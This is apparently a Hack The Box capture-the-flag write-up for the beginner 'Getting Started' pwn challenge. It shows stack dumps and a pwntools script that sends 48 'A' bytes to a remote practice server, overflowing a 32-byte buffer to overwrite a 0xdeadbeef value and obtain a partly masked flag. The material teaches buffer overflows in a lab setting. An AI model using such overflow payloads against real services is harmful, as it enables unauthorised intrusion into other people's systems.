---
title: Very Easy - Getting Started
tags:
  - pwn
---
**Challenge Description**

Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

## Challenge

**Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.**

```c title="Server Connection"
Stack frame layout 

|      .      | <- Higher addresses
|      .      |
|_____________|
|             | <- 64 bytes
| Return addr |
|_____________|
|             | <- 56 bytes
|     RBP     |
|_____________|
|             | <- 48 bytes
|   target    |
|_____________|
|             | <- 40 bytes
|  alignment  |
|_____________|
|             | <- 32 bytes
|  Buffer[31] |
|_____________|
|      .      |
|      .      |
|_____________|
|             |
|  Buffer[0]  |
|_____________| <- Lower addresses


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007fffaa3173b0 | 0x0000000000000000 <- Start of buffer
0x00007fffaa3173b8 | 0x0000000000000000
0x00007fffaa3173c0 | 0x0000000000000000
0x00007fffaa3173c8 | 0x0000000000000000
0x00007fffaa3173d0 | 0x6969696969696969 <- Dummy value for alignment
0x00007fffaa3173d8 | 0x00000000deadbeef <- Target to change
0x00007fffaa3173e0 | 0x000055a7060ad800 <- Saved rbp
0x00007fffaa3173e8 | 0x00007f8455a21c87 <- Saved return address
0x00007fffaa3173f0 | 0x0000000000000001
0x00007fffaa3173f8 | 0x00007fffaa3174c8


After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007fffaa3173b0 | 0x0000000041414141 <- Start of buffer
0x00007fffaa3173b8 | 0x0000000000000000
0x00007fffaa3173c0 | 0x0000000000000000
0x00007fffaa3173c8 | 0x0000000000000000
0x00007fffaa3173d0 | 0x6969696969696969 <- Dummy value for alignment
0x00007fffaa3173d8 | 0x00000000deadbeef <- Target to change
0x00007fffaa3173e0 | 0x000055a7060ad800 <- Saved rbp
0x00007fffaa3173e8 | 0x00007f8455a21c87 <- Saved return address
0x00007fffaa3173f0 | 0x0000000000000001
0x00007fffaa3173f8 | 0x00007fffaa3174c8


After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007fffaa3173b0 | 0x4242424241414141 <- Start of buffer
0x00007fffaa3173b8 | 0x0000000000000000
0x00007fffaa3173c0 | 0x0000000000000000
0x00007fffaa3173c8 | 0x0000000000000000
0x00007fffaa3173d0 | 0x6969696969696969 <- Dummy value for alignment
0x00007fffaa3173d8 | 0x00000000deadbeef <- Target to change
0x00007fffaa3173e0 | 0x000055a7060ad800 <- Saved rbp
0x00007fffaa3173e8 | 0x00007f8455a21c87 <- Saved return address
0x00007fffaa3173f0 | 0x0000000000000001
0x00007fffaa3173f8 | 0x00007fffaa3174c8

>> <Your Payload here>
```

We are going to make the BOF (Buffer Overflow) with the following **Python script**:

```python title="wrapper.py"
#!/usr/bin/python3

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '94.237.53.3' # Change this
PORT = 50135      # Change this

r    = remote(IP, PORT)

# Craft payload
payload = b'A' * 10 # Change the number of "A"s

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

The challenge says that we need to overwrite the following value `0xdeadbeef`

```c
0x0000000000000000 <- Start of buffer
0x0000000000000000
0x0000000000000000
0x0000000000000000
0x6969696969696969 <- Dummy value for alignment
0x00000000deadbeef <- Target to change
0x000055a7060ad800 <- Saved rbp
0x00007f8455a21c87 <- Saved return address
0x0000000000000001
0x00007fffaa3174c8
```

After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:

```c
0x0000000041414141 <- Start of buffer
0x0000000000000000
0x0000000000000000
0x0000000000000000
0x6969696969696969 <- Dummy value for alignment
0x00000000deadbeef <- Target to change
0x000055a7060ad800 <- Saved rbp
0x00007f8455a21c87 <- Saved return address
0x0000000000000001
0x00007fffaa3174c8
```

Every value `0x0000000000000000` has 8 bytes, that means that if we put eight 'A', it will look like this `0x4141414141414141`. With that in mind, we can now try to overwrite `0x00000000deadbeef`:

```python title="wrapper.py"
#!/usr/bin/python3

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '94.237.53.3' # Change this
PORT = 50135      # Change this

r    = remote(IP, PORT)

# Craft payload
payload = b'A' * (8*6) # 8 = bytes & 6 = values

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

```bash
❯ python3 wrapper.py

[+] Opening connection to 94.237.53.3 on port 50135: Done
[+] Flag --> HTB{b0f_********_4r3_g00d}
[*] Closed connection to 94.237.53.3 port 50135
```

```c
0x4141414141414141 <- Start of buffer
0x4141414141414141
0x4141414141414141
0x4141414141414141
0x4141414141414141 <- Dummy value for alignment
0x4141414141414141 <- Target to change
```

**HTB{b0f\_\*\*\*\*\*\*\*\*\_4r3\_g00d}**

**Reference:**

- https://app.hackthebox.com/challenges/Getting%2520Started